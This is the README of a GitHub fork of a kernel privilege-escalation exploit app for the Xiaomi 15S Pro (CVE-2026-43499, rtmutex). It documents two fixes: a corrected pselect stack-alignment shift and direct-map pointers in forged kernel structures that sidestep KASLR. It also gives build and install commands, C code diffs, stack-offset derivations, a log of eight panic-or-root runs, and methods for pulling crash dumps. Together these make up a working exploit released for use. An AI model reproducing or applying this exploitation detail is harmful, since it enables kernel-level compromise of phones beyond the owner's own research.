# GhostLock XRING O1 — dijun / 25042PN24C 修复版

> 基于 [ayyy7128/ghostlock-xringo1](https://github.com/ayyy7128/ghostlock-xringo1) 的 fork，
> 修复了小米 15S Pro（玄戒 O1 / `dijun` / `25042PN24C`）上无法提权的两处缺陷。

**实测结果：root 成功。** `su -c id` → `uid=0(root) gid=0(root) context=u:r:ksu:s0`，
KernelSU 模块 `Live`，SELinux 恢复 `Enforcing`，全程未重启（boot_id 不变）。

---

## 一句话结论

原版在本机型上失败，**不是偏移表错了**（19/19 字段、2/2 符号全部验证正确），
而是两处**与具体构建强相关**的参数写错了：

| # | 问题 | 原值 | 修正 |
|---|---|---|---|
| 1 | `pselect_waiter_shift` 栈对齐 | `0` | **`-2`** |
| 2 | 伪造结构体里的内核指针受 KASLR 影响 | `text_addr()` 镜像虚拟地址 | **`data_addr()` 直接映射别名** |

**两个 bug 互相掩盖**：只修任意一个都仍然失败，表现为**不同的**崩溃形态。

---

## 支持范围

| 项目 | 值 |
|---|---|
| 机型 | Xiaomi 15S Pro（`25042PN24C` / `dijun`） |
| 内核 | `6.6.77-android15-8-g5770c661275f-abogki443185593-4k` |
| 系统 | HyperOS 3.0.302.0.WODCNXM / Android 16 |
| Root 方式 | KernelSU `late-load`（临时，重启失效） |

> 6.6.118 配置未改动，保持上游行为。其他机型/内核未验证。

---

## 快速使用

```powershell
# 1. 构建
$env:ANDROID_NDK_HOME = "<你的NDK29路径>"
$env:JAVA_HOME = "<JDK17+>"
.\build-native.cmd                                  # 编译原生二进制
.\gradlew.bat :app:assembleRelease -Pghostlock.native=true

# 2. 安装
adb install -r app/build/outputs/apk/release/*.apk
adb shell appops set com.ayyy.glxring MANAGE_EXTERNAL_STORAGE allow

# 3. 打开应用点「执行」，约 27 秒
# 4. 验证
adb shell su -c id
adb shell cat /proc/modules | findstr kernelsu
```

崩溃日志自动写入 `/storage/emulated/0/Download/ghostlock-<时间戳>.log`。

---

## 修复详解

### 修复 1：`pselect_waiter_shift` 从 0 改为 −2

原版为 6.6.77 配置写的 `0` 是错的。正确值来自**两条系统调用链的栈帧累加**：

```
futex 链:   __arm64_sys_futex(−0x70) → do_futex(−0x60) → futex_wait_requeue_pi(−0x1c0)
            waiter 在 futex_wait_requeue_pi 的 sp+0x90
            ⇒ 绝对位置 = S₀ − 0x290 + 0x90 = S₀ − 0x200

pselect 链: __arm64_sys_pselect6(−0x90) → core_sys_select(−0x1f0)
            stack_fds 在 core_sys_select 的 sp+0x80
            ⇒ 绝对位置 = S₀ − 0x280 + 0x80 = S₀ − 0x200
```

两者**完全重合**。而对齐公式是 `8 × (shift + 2) = waiter − stack_fds = 0`，故 `shift = −2`。

> 推导前提：`invoke_syscall` 用 `blr`（非尾调用），两条链深度相同，因此差值只依赖各自帧尺寸。

**约束验证**：fd_set 共 15 个字（下标 0–14），waiter 占第 2–14 字。
`shift` 必须满足 `2+shift ≥ 0` 且 `14+shift ≤ 14`，唯一合法值只有 `−2 / −1 / 0`。
实测 `1` 会直接报 `pselect cannot place wake_state`（越界）。

### 修复 2：伪造结构体指针改用直接映射别名

`util.c` 里三处：

```c
// 修复前（镜像虚拟地址，受 KASLR 影响）
uint64_t waiter_task = text_addr(INIT_TASK);
uint64_t task_group  = text_addr(ROOT_TASK_GROUP);
uint64_t pi_top_task = text_addr(INIT_TASK);

// 修复后（__va(phys)，不受 KASLR 影响，指向同一物理页）
uint64_t waiter_task = data_addr(INIT_TASK);
uint64_t task_group  = data_addr(ROOT_TASK_GROUP);
uint64_t pi_top_task = data_addr(INIT_TASK);
```

**为什么必须改**：`main.c` 里 `kaslr_slide` 被硬编码为 `0`，但本机 KASLR **确实开启**。
两次真实 panic 给出不同偏移：

```
Kernel Offset: 0x24f8e00000 from 0xffffffc080000000   (12:12:56)
Kernel Offset: 0x2ce6000000 from 0xffffffc080000000   (10:04:25)
```

写 `selinux_enforcing` 用的是直接映射（不受影响，所以目标地址一直是对的）；
但塞进伪造 `rt_mutex_waiter` / `task_struct` 的是镜像虚拟地址，会偏移整个 slide。

### 附带修复：崩溃日志落盘

`MainActivity.java` 新增文件 sink，解决「崩溃后拿不到任何诊断信息」的问题：

- 启动即在 `Download/` 建日志（先验证可写，再跑 exploit）
- 每行 `flush` + 每 150 ms `fsync`（panic 时页缓存会丢，必须 fsync）
- 写入**原始行**（在 UI 美化过滤之前）
- 四级回退：公共 Download → 应用外部目录 → 内部存储

---

## 失败模式对照

修复前后 8 次真机运行的完整记录（同一台设备）：

| # | phys_offset / load | shift | 指针 | 结果 |
|---|---|---|---|---|
| 1 | 0 / 0x200000 | −2 | text_addr | **soft lockup**，CPU 卡 104s，长按电源键强杀 |
| 2 | 0 / 0x200000 | 0 | text_addr | panic，`_raw_spin_trylock` NULL deref，2.4s 重启 |
| 3 | 0 / 0x200000 | 0 | text_addr | 同上（复现一致） |
| 4 | 0x80000000 / 0xA8000000 | 0 | text_addr | panic，崩溃点不变 |
| 5 | 0x80000000 / 0xA8000000 | 1 | text_addr | 字段越界，结构不可行 |
| 6 | 0 / 0x200000 | −1 | text_addr | panic，恢复耗时 105s |
| 7 | 0 / 0x200000 | 0 | **data_addr** | panic，NULL deref（对齐仍错） |
| 8 | 0 / 0x200000 | **−2** | **data_addr** | ✅ **root 成功** |

**关键对照**：7 修了指针但 shift 仍错 → 仍崩；8 两者都修 → 成功。

---

## 取证方法（无需 root）

原版崩溃后拿不到日志（pstore 被 SELinux 挡、`/proc/last_kmsg` 不存在、`dmesg` 拒绝）。
本项目验证了两条 shell 身份可用的路径：

```powershell
# 1. dropbox（快，含 SYSTEM_LAST_KMSG）
adb shell dumpsys dropbox --print

# 2. bugreport（全，能带出厂商内核转储）
adb bugreport <输出目录>
#   解包后 FS/ 树里有 /data/miuilog/stability/reboot/*_ke_*.zip
#   内含 temp/last_kmsg（1MB）+ temp/minidump.gz（45MB）+ 44 条 md_history
```

原因：`bugreport` 的 dumpstate 域权限高于 shell，能带出 shell 直接 `ls` 会 Permission denied 的路径。

---

## 工具链

本项目的分析依赖从官方完整系统包（`dijun-images-OS3.0.302.0.WODCNXM...tgz`）提取的内核镜像：

| 步骤 | 产出 | 说明 |
|---|---|---|
| 解包 boot.img | `dijun-Image` | 未压缩 PE32+ arm64，34.77 MB |
| 解析 BTF | 139,407 个类型 | 验证 19 个结构体字段偏移 |
| 解析 kallsyms | **108,902 个符号** | 定位 `core_sys_select` 等函数并反汇编 |
| 解析 vendor_boot DTB | `/memory@0`、`/chosen` | 确认 RAM 基址 0x0、`kasan=off` |

详见 `docs/`。

---

## 已知限制

- **临时 root**：`late-load` 运行时注入，重启失效。bootloader 锁定（`flash.locked=1`），
  无法用 `ksud boot-patch` 持久化。
- **未验证 6.6.118**：该配置保持上游值，理论不受本次修改影响。
- **KASLR 未直接测得**：`perf` 内核态采样被 SELinux `perf_event { kernel }` 拦截，
  slide 由 panic 日志间接证实。

---

## 许可与致谢

本项目沿用上游 **Apache License 2.0**（见 `LICENSE`）。

- 上游：[ayyy7128/ghostlock-xringo1](https://github.com/ayyy7128/ghostlock-xringo1)
- 参考：[RecRivenVI/ghostlock-app](https://github.com/RecRivenVI/ghostlock-app)、
  [YuKongA/ghostlock-app](https://github.com/YuKongA/ghostlock-app)
- 漏洞：CVE-2026-43499（`rtmutex: Use waiter::task instead of current in remove_waiter()`）

项目内的 KernelSU / ReSukiSU 等上游组件仍受其各自许可约束。

> 仅供自有设备上的授权安全研究。本工具会修改内核内存，失败时会导致 panic 或重启。
